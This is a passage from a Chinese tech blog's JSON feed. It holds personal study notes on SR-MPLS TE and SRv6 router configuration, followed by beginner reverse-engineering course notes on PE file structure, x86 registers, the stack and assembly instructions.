class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IP MPLS IGP TE</span><br><span class=\"line\"></span><br><span class=\"line\">PE</span><br><span class=\"line\">explicit-path to_asbr</span><br><span class=\"line\">next sid label 48140 type adja</span><br><span class=\"line\">next sid label 48141 type adja</span><br><span class=\"line\"></span><br><span class=\"line\">int t0/0/01</span><br><span class=\"line\">ip add unnum int l 0 </span><br><span class=\"line\">tunnel-pro mpls te</span><br><span class=\"line\">dest 3.3.3.3</span><br><span class=\"line\">mpls te signal-protoc segment</span><br><span class=\"line\">mpls te tunnel-id 1</span><br><span class=\"line\">mpls te path explicit to_asbr</span><br><span class=\"line\"></span><br><span class=\"line\">ASBR</span><br><span class=\"line\">explict to_pe</span><br><span class=\"line\">next sid label 48140 type adja</span><br><span class=\"line\">next sid label 48140 type adja</span><br><span class=\"line\"></span><br><span class=\"line\">int t0/0/01</span><br><span class=\"line\">ip add unnum int l 0 </span><br><span class=\"line\">tunnel-pro mpls te</span><br><span class=\"line\">dest 1.1.1.1</span><br><span class=\"line\">mpls te signal-protoc segment</span><br><span class=\"line\">mpls te tunnel-id 1</span><br><span class=\"line\">mpls te path explicit to_asbr</span><br><span class=\"line\"></span><br><span class=\"line\">ASBR-ASBR</span><br><span class=\"line\">ip rou 4.4.4.4 32 10.1.34.4</span><br><span class=\"line\">bgp 100</span><br><span class=\"line\">peer 4.4.4.4 as 200</span><br><span class=\"line\">peer 4.4.4.4 con l 0 </span><br><span class=\"line\">peer 4.4.4.4 ebgp</span><br><span class=\"line\">peer 4.4.4.4 egress-eng</span><br><span class=\"line\">net 6.6.6.6</span><br><span class=\"line\">link-state unicast</span><br><span class=\"line\"></span><br><span class=\"line\">isis </span><br><span class=\"line\">import bgp</span><br><span class=\"line\"></span><br><span class=\"line\">PE</span><br><span class=\"line\">int  t0/0/1</span><br><span class=\"line\">mpls te binding label 1000</span><br><span class=\"line\"></span><br><span class=\"line\">explicit to_pe6</span><br><span class=\"line\">next sid label 1000</span><br><span class=\"line\">next sid label 48182</span><br><span class=\"line\">next label 2000</span><br><span class=\"line\"></span><br><span class=\"line\">int t0/0/3</span><br><span class=\"line\">ip add</span><br><span class=\"line\">tunnel mpls te </span><br><span class=\"line\">mpls te signal segment</span><br><span class=\"line\">des 6.6.6.6</span><br><span class=\"line\">mpls te tu 2</span><br><span class=\"line\">mpls te ex to_pe6</span><br><span class=\"line\"></span><br><span class=\"line\">bgp 100</span><br><span class=\"line\">peer 6.6.6.6 as 200</span><br><span class=\"line\">peer 6.6.6.6 con l 0 </span><br><span class=\"line\">peer 6.6.6.6 ebgp</span><br><span class=\"line\">ipv4 vpnv4</span><br><span class=\"line\">prrt 6.6.6.6 en</span><br><span class=\"line\">ipv4 vpn-instance </span><br><span class=\"line\"></span><br><span class=\"line\">tunnel-policy to_pe6</span><br><span class=\"line\">tunnel ses sr-te lo 1</span><br><span class=\"line\">ip vpn </span><br><span class=\"line\">tnl </span><br></pre></td></tr></table></figure>\n<p>Binding SID</p>\n<p>SR-MPLS TE 隧道可以做为一种转发邻接。如果将 SR-MPLS TE 隧道做为转发邻接分配一个邻接 SID（Adjacency SID），则该 SID 可以标识 SR-MPLS TE 隧道，利用这个 SID 就可以将数据流量导入 SR-MPLS TE 隧道，实施 TE 策略</p>\n<p>Binding SID 意味着将使用该 SID 的流量与一个 SR-MPLS TE 隧道或者一个 TE 策略绑定。Binding SID 在 AS 域内的转发器上配置，一个 Binding SID 代表一条域内 SR-MPLS TE 隧道</p>\n<h2 id=\"srv6\"><a class=\"markdownIt-Anchor\" href=\"#srv6\">#</a> SRv6</h2>\n<p>使用 IPv6 数据平面，基于 IPv6 路由扩展头进行扩展</p>\n<p>通过在 IPV6 报头中增加 SRH 扩展头实现 SRv6</p>\n<p>该扩展头指定一个 IPv6 的显式路径，存储的是 IPv6 的 Segment List 信息，其作用与 SR MPLS 里的 Segment List 一样。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1646962227447-7498c5a3-ab67-417c-a6bb-6cf6e7e4486c.png\" alt=\"img\"></p>\n<p><code>Segment List</code> : 有序的 SRv6 SID 列表</p>\n<p><code>Segments Left(SL)</code> : SRv6 激活的 SID 为 Slist [SL]。转发过程中通过修改 SL，同时更换 DIP 为活跃的 SID 来分段完成转发。</p>\n<p><code>Tag</code> : 用于对数据包分组，可以实现基于组的策略。</p>\n<p><code>SRH TLVs </code> (NSH metadata，HMAC TLV,Padding TLv 等)︰可以作为 Segment List 的 sID 共同使用的全局参数。</p>\n<p>通过扩展头 SRH 中内容确定 IPV6destination address。</p>\n<p>在 SRv6 中，IPv6 DA 仅标识当前报文的下一个节点，是不断变换的。</p>\n<p>&lt;Segment List [0], Segment List [1], …, Segment List [n-1], Segment List [n]&gt;：SRv6 报文的段列表，类似于 SR-MPLS 中的 MPLS 标签栈信息，在入节点生成。Segment List [n] 是 SRv6 路径上第一个需要被处理的 Segment List；Segment List [n-1] 是第二个；Segment List [1] 是倒数第二个；Segment List [0] 是倒数第一个。</p>\n<p>SRv6 按照从栈底从栈顶处理 segment list，和 SR 相反</p>\n<p>在 SRv6 中，每经过一个 SRv6 节点，Segments Left（SL）字段减 1，IPv6 DA 信息变换一次。Segments Left 和 Segment List 字段共同决定 IPv6 DA 信息。</p>\n<p>segment 在处理后也不弹出</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1646962793965-aa63ed56-8ce8-43eb-ae40-8abb17323199.png\" alt=\"img\"></p>\n<h3 id=\"srv6三层可编程能力\"><a class=\"markdownIt-Anchor\" href=\"#srv6三层可编程能力\">#</a> SRv6 三层可编程能力</h3>\n<p>第一层是 segment List。它可以将多个 Segment 组合，形成 SRv6 路径。这一点和 MPLs 标签栈类似。</p>\n<p>第二层是对 SRv6 SID 128 bit 地址的运用。MPLs 标签中四个段是定长的 (20 bit 标签、8 bit TTL、3 bit Tc 和 1 bit 栈底标识)。而 SRv6 SID 的 128 bit 可以灵活分段，并且每个段的长度也可以变化。由此 SRv6 具备更灵活的可编程能力。</p>\n<p>第三层是紧接在 Segment Llist 后的可选 TLV。报文在网络中传送时，如果需要在转发平面封装一些非规则类的信息，可以通过在 SRH 中 TLv 的灵活组合来完成。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1646963384530-ea5d3c4c-91ef-4864-9b1a-8ae86d240080.png\" alt=\"img\"></p>\n<p>节点配置 Locator 之后，系统会生成一条 Locator 网段路由，<strong>并且通过 IGP 在 SR 域内扩散。网络里其他节点通过 Locator 网段路由就可以定位到本节点</strong>，同时本节点发布的所有 SRv6 SID 也都可以通过该条 Locator 网段路由到达。</p>\n<p>Function 代表设备的指令（Instruction），这些指令都由设备预先设定，Function 部分<strong>用于指示 SRv6 SID 的生成节点进行相应的功能操作。</strong></p>\n<p>指令就是转发信息，他与 SRv6 SID 相关，每一个 SID 代表隐含的转发指令，生成 SRv6 SID 的设备会生成 SID 表，存储了与本 SRv6 SID 相关指令</p>\n<p>Function 部分还可以分出一个可选的参数段（Arguments），此时 SRv6 SID 的格式变为 Locator:Function:Arguments，Arguments 占据 IPv6 地址的低比特位，通过 Arguments 字段可以定义一些报文的流和服务等信息。</p>\n<p>end,end.x Locator 需要手动配置，.DT4 或.DT6 Locator 可以手动配置或 BGP 自动生成</p>\n<p>3. <code>第三层是紧接在SegmentList后的可选TLV</code></p>\n<h3 id=\"srv6-sid\"><a class=\"markdownIt-Anchor\" href=\"#srv6-sid\">#</a> SRv6 SID</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">End SID</span><br></pre></td></tr></table></figure>\n<p>标识某个节点，类似于 node SID，通过 IGP 扩散</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1646964052858-59b3bfb7-e664-4dfc-b93d-9c1056f07991.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">End.x SID</span><br></pre></td></tr></table></figure>\n<p>End.X SID 表示三层交叉连接的 Endpoint SID，用于标识网络中的某条链路。类似 SR-MPLS 中的 Adjacency SID。</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1646964288229-6874d999-51cf-4513-b2d2-b7dae3ec90a9.png\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">End.DT4 SID</span><br></pre></td></tr></table></figure>\n<p>End.DT4 SID 表示 PE 类型的 Endpoint SID，<strong>用于标识网络中的某个 IPv4 VPN 实例</strong>。End.DT4 SID 对应的转发动作是解封装报文，并且查找 IPv4 VPN 实例路由表转发。End.DT4 SID 在 L3VPNv4 场景使用，<strong>等价于 IPv4 VPN 的标签</strong>。End.DT4 SID 也可以用于标识公网实例。</p>\n<p>End.DT4 SID 可以通过静态配置生成，也可以通过<strong> BGP 在 Locator 的动态 SID 范围内自动分配</strong>。</p>\n<p><strong>只需要在 PE 节点生成环回路由和 locator 路由，中间节点不需要</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">End.DT6 SID</span><br></pre></td></tr></table></figure>\n<p>End.DT6 SID 表示 PE 类型的 Endpoint SID，<strong>用于标识网络中的某个 IPv6 VPN 实例</strong>。End.DT6 SID 对应的转发动作是解封装报文，并且查找 IPv6 VPN 实例路由表转发。End.DT6 SID 在 L3VPNv6 场景使用，<strong>等价于 IPv6 VPN 的标签</strong>。End.DT6 SID 也可以用于标识公网实例。</p>\n<p>End.DT6 SID 可以通过静态配置生成，也可以通过 BGP 在 Locator 的动态 SID 范围内自动分配。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置end.dt4</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置接口地址</span><br><span class=\"line\"></span><br><span class=\"line\">PE：</span><br><span class=\"line\">全局使能</span><br><span class=\"line\">segment routing</span><br><span class=\"line\"></span><br><span class=\"line\">PE上配置环回，用于后续建立VPN邻居</span><br><span class=\"line\">ipv6 address </span><br><span class=\"line\"></span><br><span class=\"line\">segment-routing ipv6</span><br><span class=\"line\">  encapu source-address //指定隧道源,即PE上的Loopback</span><br><span class=\"line\">  locator aa ipv6-ptefix 2001:: 64 static 32  //配置locator路由,32是可自定义空间</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">运行IGP协议,中间节点不需要起segment-routing ipv6 locator aa</span><br><span class=\"line\">isis</span><br><span class=\"line\">  is-level</span><br><span class=\"line\">  cost-style</span><br><span class=\"line\">  network-entity</span><br><span class=\"line\">  ipv6 enable t ipv6</span><br><span class=\"line\">  segemnt-routing ipv6 locator aa a</span><br><span class=\"line\">  </span><br><span class=\"line\">//display Segment ipv6 local-sid </span><br><span class=\"line\">//display isis route </span><br><span class=\"line\"></span><br><span class=\"line\">配置VPN实例</span><br><span class=\"line\">  ip vpn-instance</span><br><span class=\"line\">  \troute</span><br><span class=\"line\">  \tvpn-target</span><br><span class=\"line\">  </span><br><span class=\"line\">配置function,argu</span><br><span class=\"line\">  segment-routing ipv6</span><br><span class=\"line\">    locator aa</span><br><span class=\"line\">      opcode ::100 end-dt4 vpn-instance site_a  //通过查询VPN-instance做路由转发</span><br><span class=\"line\"></span><br><span class=\"line\">//PE之间运行BGP</span><br><span class=\"line\">  BGP 100</span><br><span class=\"line\">    router-id</span><br><span class=\"line\">    peer 2001::1 as 100</span><br><span class=\"line\">    peer 2001:1 con l   0</span><br><span class=\"line\">    ipv4-family vpnv4</span><br><span class=\"line\">      peer 2001:: enable</span><br><span class=\"line\">      peer 2001:: prefix-sid</span><br><span class=\"line\">    ipv4 vpn-instance</span><br><span class=\"line\">      segment ipv6 locator auto-sid-disable</span><br><span class=\"line\">      segment ipv6 best-effort</span><br><span class=\"line\">      </span><br></pre></td></tr></table></figure>\n<p>对于不支持 SRv6 的设备可以通过 Multi topology reachable ipv6 prefixes 计算 locator 路由（TLV 237）</p>\n<p>对于支持的设备通过 locator 携带，TLV 27</p>\n<p>SID 谁生成谁传播，DT4 SID 只能由 BGP 传播</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/",
            "url": "http://example.com/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/",
            "title": "水滴rev",
            "date_published": "2023-01-03T05:38:45.000Z",
            "content_html": "<h1 id=\"滴水reverse\"><a class=\"markdownIt-Anchor\" href=\"#滴水reverse\">#</a> 滴水 reverse</h1>\n<h2 id=\"公开课\"><a class=\"markdownIt-Anchor\" href=\"#公开课\">#</a> 公开课</h2>\n<p>PE 文件结构</p>\n<p>任何一个在 Windows 上运行的可执行文件都要遵守一定的格式，这个格式就是 PE 文件结构，比如:exe, dIl, 部分 sys</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20191105010140189.png\" alt=\"img\"></p>\n<p>此处可使用 PEID 或 ExeinfoPE 进行代替</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210120028888.png\" alt=\"image-20221210120028888\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210132659775.png\" alt=\"image-20221210132659775\"></p>\n<p>32 位计算机最大内存 4G，寻址宽度 32 位</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210141922512.png\" alt=\"image-20221210141922512\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210141955667.png\" alt=\"image-20221210141955667\"></p>\n<p>push esp-4 , 压栈，EIP +4</p>\n<p>call EIP 跳转，esp-4 压栈</p>\n<p>ret 将栈中的地址弹出到 EIP，esp-4</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211125947066.png\" alt=\"image-20221211125947066\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211130508986.png\" alt=\"image-20221211130508986\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211131806741.png\" alt=\"image-20221211131806741\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211133036307.png\" alt=\"image-20221211133036307\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211133000935.png\" alt=\"image-20221211133000935\"></p>\n<p>arr [6] 是 ebp+4，放的是函数返回值的地址，修改了返回值在函数返回时会自动执行</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211133428315.png\" alt=\"image-20221211133428315\"></p>\n<p>全局变量在 pe 头的数据中，局部变量在堆栈中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211135158527.png\" alt=\"image-20221211135158527\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211135229931.png\" alt=\"image-20221211135229931\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211134515487.png\" alt=\"image-20221211134515487\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221211134557068.png\" alt=\"image-20221211134557068\"></p>\n<h2 id=\"进制\"><a class=\"markdownIt-Anchor\" href=\"#进制\">#</a> 进制</h2>\n<p>进制的本质是查数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221212151456236.png\" alt=\"image-20221212151456236\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221212151324431.png\" alt=\"image-20221212151324431\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221212151333052.png\" alt=\"image-20221212151333052\"></p>\n<h2 id=\"数据宽度\"><a class=\"markdownIt-Anchor\" href=\"#数据宽度\">#</a> 数据宽度</h2>\n<p>4 位宽度表示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213152958630.png\" alt=\"image-20221213152958630\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213153742328.png\" alt=\"image-20221213153742328\"></p>\n<p>8 位宽度表示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213153933311.png\" alt=\"image-20221213153933311\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213154014302.png\" alt=\"image-20221213154014302\"></p>\n<p>16 位宽度表示</p>\n<p>32 位宽度表示</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213154324319.png\" alt=\"image-20221213154324319\"></p>\n<p>6、几个重要的计量单位:</p>\n<p>BYTE 字节 8BIT</p>\n<p>WORD 字 16BIT 2 字节</p>\n<p>DWORD 双字 32BIT 4 字节</p>\n<p>or</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213154728965.png\" alt=\"image-20221213154728965\"></p>\n<p>and</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213155024628.png\" alt=\"image-20221213155024628\"></p>\n<p>xor</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213155128086.png\" alt=\"image-20221213155128086\"></p>\n<p>not</p>\n<p>2+3</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221210132659775.png\" alt=\"image-20221210132659775\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213160855262.png\" alt=\"image-20221213160855262\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213160948087.png\" alt=\"image-20221213160948087\"></p>\n<h2 id=\"寄存器\"><a class=\"markdownIt-Anchor\" href=\"#寄存器\">#</a> 寄存器</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213162041512.png\" alt=\" \"></p>\n<p>mov ebx,0x123456789    //ebx=23456789  忽略高位，1 是高位</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213171205765.png\" alt=\"image-20221213171205765\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213171554801.png\" alt=\"image-20221213171554801\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213174336225.png\" alt=\"image-20221213174336225\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213175435630.png\" alt=\"image-20221213175435630\"></p>\n<p><img data-src=\"../AppData/Roaming/Typora/typora-user-images/image-20221213182649856.png\" alt=\"image-20221213182649856\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213183047619.png\" alt=\"image-20221213183047619\"></p>\n<p><strong>我们可以打补丁或者其他方式拓展内存</strong></p>\n<h2 id=\"内存\"><a class=\"markdownIt-Anchor\" href=\"#内存\">#</a> 内存</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213183647234.png\" alt=\"image-20221213183647234\"></p>\n<p>栈中每四个内存单元一组</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221213184806456.png\" alt=\"image-20221213184806456\" style=\"zoom:200%;\" />\n<p>数据窗口中以小端存储以 db 查看时</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214203828764.png\" alt=\"image-20221214203828764\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214203909142.png\" alt=\"image-20221214203909142\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214204249791.png\" alt=\"image-20221214204249791\"></p>\n<p>0012FFDC = E4</p>\n<p>0012FFDD = 7C</p>\n<p>在数据窗口是小端在前</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214205211991.png\" alt=\"image-20221214205211991\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214205617926.png\" alt=\"image-20221214205617926\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214210429166.png\" alt=\"image-20221214210429166\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214210441256.png\" alt=\"image-20221214210441256\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214210742628.png\" alt=\"image-20221214210742628\"></p>\n<h2 id=\"堆栈\"><a class=\"markdownIt-Anchor\" href=\"#堆栈\">#</a> 堆栈</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214213244308.png\" alt=\"image-20221214213244308\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214213607192.png\" alt=\"image-20221214213607192\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214214015040.png\" alt=\"image-20221214214015040\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221214214825379.png\" alt=\"image-20221214214825379\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push imm    //esp-4</span><br><span class=\"line\">push al     //不能push8位</span><br><span class=\"line\">push ax     //esp-2</span><br><span class=\"line\">push eax    //esp-4</span><br><span class=\"line\">push dword ptr ds:[12FFDC]   //esp-4</span><br><span class=\"line\">push word ptr ds:[12FFDC]    //esp-2</span><br><span class=\"line\">push byte ptr ds:[12FFDC]    //不能push 8位内存</span><br><span class=\"line\"></span><br><span class=\"line\">pushad   //将所有通用寄存器入栈</span><br><span class=\"line\">popad </span><br></pre></td></tr></table></figure>\n<h2 id=\"jcc\"><a class=\"markdownIt-Anchor\" href=\"#jcc\">#</a> JCC</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219205236604.png\" alt=\"image-20221219205236604\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219205328411.png\" alt=\"image-20221219205328411\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219210046713.png\" alt=\"image-20221219210046713\"></p>\n<p>只计算最低有效字节中的 1 的个数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219210317802.png\" alt=\"image-20221219210317802\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">看当前数据宽度/2 中间的位是否进位</span><br><span class=\"line\">12345678  看5是否产生进位</span><br><span class=\"line\">16位，8位一样 </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219210949437.png\" alt=\"image-20221219210949437\"></p>\n<p>test 和 xor 的区别</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219211306372.png\" alt=\"image-20221219211306372\"></p>\n<hr>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219212150517.png\" alt=\"image-20221219212150517\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219213621597.png\" alt=\"image-20221219213621597\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219213712037.png\" alt=\"image-20221219213712037\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219213903993.png\" alt=\"image-20221219213903993\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adc al,cl</span><br><span class=\"line\">al = al + cl + 进位标志carry(1)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219214113901.png\" alt=\"image-20221219214113901\"></p>\n<p>Borrow</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219214341294.png\" alt=\"image-20221219214341294\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219214413526.png\" alt=\"image-20221219214413526\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219215219369.png\" alt=\"image-20221219215219369\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movs stos  